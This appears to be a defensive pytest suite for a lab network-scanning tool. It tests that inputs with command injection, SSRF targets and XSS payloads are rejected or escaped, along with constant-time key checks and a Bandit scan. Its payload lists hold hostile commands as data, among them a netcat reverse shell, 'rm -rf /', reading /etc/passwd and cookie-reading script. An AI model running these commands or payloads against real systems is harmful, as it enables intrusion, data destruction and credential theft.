"""
Week 6 Security Test Suite — Static & Dynamic OWASP Hardening Verification.

Validates:
1. Command injection rejection against comprehensive adversarial inputs.
2. Scope boundary enforcement (anti-SSRF and allowlist confinement).
3. Stored XSS defense: HTML reports autoescape malicious service banners.
4. Timing-attack safe credential comparison.
5. Automated Bandit AST static analysis passes with 0 medium/high findings.
"""

from __future__ import annotations

import secrets
import subprocess
import sys
from pathlib import Path

import pytest

from app.core.errors import AllowlistError, ValidationError
from app.core.validation import Allowlist, AllowlistEntry, validate_target
from app.reports.builder import build_html_report

PROJECT_ROOT = Path(__file__).resolve().parents[2]


@pytest.fixture
def strict_lab_allowlist() -> Allowlist:
    """Allowlist strictly permitting only a single lab VM."""
    return Allowlist(
        entries=[
            AllowlistEntry("ip", "192.168.56.101", "Lab VM 1"),
        ],
        allowed_profiles=["quick", "standard"],
    )


class TestCommandInjectionDefense:
    """Comprehensive adversarial testing for input sanitization."""

    INJECTION_PAYLOADS = [
        "192.168.56.101; cat /etc/passwd",
        "192.168.56.101 & whoami",
        "192.168.56.101 && id",
        "192.168.56.101 | nc -e /bin/sh 10.0.0.1 4444",
        "192.168.56.101 `id`",
        "192.168.56.101 $(reboot)",
        "192.168.56.101\nls -la",
        "192.168.56.101\r\nid",
        "192.168.56.101' OR '1'='1",
        '192.168.56.101" --script exploit',
        "192.168.56.101 > /dev/null",
        "192.168.56.101 < /dev/zero",
        "192.168.56.101; rm -rf /",
        "192.168.56.101 # comment",
        "192.168.56.101%20whoami",
        "192.168.56.101^dir",
        "192.168.56.101${IFS}id",
    ]

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_rejection_of_shell_metacharacters(self, strict_lab_allowlist, payload):
        """All shell metacharacters must trigger ValidationError before any execution."""
        with pytest.raises(ValidationError):
            validate_target(payload, strict_lab_allowlist)


class TestScopeAndSSRFProtection:
    """Verifies that requests cannot reach unintended internal or cloud-metadata targets."""

    UNAUTHORIZED_TARGETS = [
        "127.0.0.1",          # Localhost / loopback
        "169.254.169.254",    # AWS/GCP cloud instance metadata service
        "10.0.0.1",           # Corporate internal subnet
        "172.16.0.1",         # Docker / private subnet
        "8.8.8.8",            # Public internet target
        "evil.attacker.com",  # Arbitrary external hostname
    ]

    @pytest.mark.parametrize("target", UNAUTHORIZED_TARGETS)
    def test_unauthorized_targets_rejected(self, strict_lab_allowlist, target):
        """Any target outside allowlist must raise AllowlistError."""
        with pytest.raises(AllowlistError):
            validate_target(target, strict_lab_allowlist)


class TestStoredXSSDefenseInReports:
    """Verifies that malicious payloads inside scan data are safely autoescaped in HTML."""

    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '"><svg onload=alert(document.cookie)>',
        "javascript:alert(1)",
    ]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_malicious_banners_autoescaped(self, payload):
        scan = {"target": "192.168.56.101", "profile": "quick", "scan_id": "test-xss"}
        hosts = [{"ip": "192.168.56.101", "hostname": payload}]
        services = [{
            "port": 80,
            "service_name": payload,
            "product": payload,
            "version": payload,
            "cpe": "[]",
        }]
        findings = [{
            "cve_id": "CVE-2021-44228",
            "title": payload,
            "description": payload,
            "severity": "CRITICAL",
            "priority_score": 90.0,
            "evidence_type": "observed",
            "evidence_detail": payload,
        }]

        html = build_html_report(scan, hosts, services, findings)

        # Raw executable tags must NOT appear unescaped in HTML
        assert "<script>" not in html
        assert "<img src=x onerror" not in html
        assert "<svg onload" not in html


class TestTimingAttackResistance:
    """Verifies that API key comparison uses constant-time matching."""

    def test_compare_digest_used_for_keys(self):
        secret_key = "a" * 64
        candidate_matching = "a" * 64
        candidate_differ_early = "b" + "a" * 63
        candidate_differ_late = "a" * 63 + "b"

        assert secrets.compare_digest(secret_key, candidate_matching) is True
        assert secrets.compare_digest(secret_key, candidate_differ_early) is False
        assert secrets.compare_digest(secret_key, candidate_differ_late) is False


class TestBanditSecurityAudit:
    """Programmatic execution of Bandit AST scanner ensuring 0 medium/high findings."""

    def test_bandit_ast_scan_clean(self):
        cmd = [
            sys.executable,
            "-m",
            "bandit",
            "-r",
            "app/",
            "-c",
            "pyproject.toml",
            "-q",
        ]
        result = subprocess.run(
            cmd,
            cwd=str(PROJECT_ROOT),
            capture_output=True,
            text=True,
            check=False,
        )
        assert result.returncode == 0, f"Bandit security scan failed:\n{result.stdout}\n{result.stderr}"

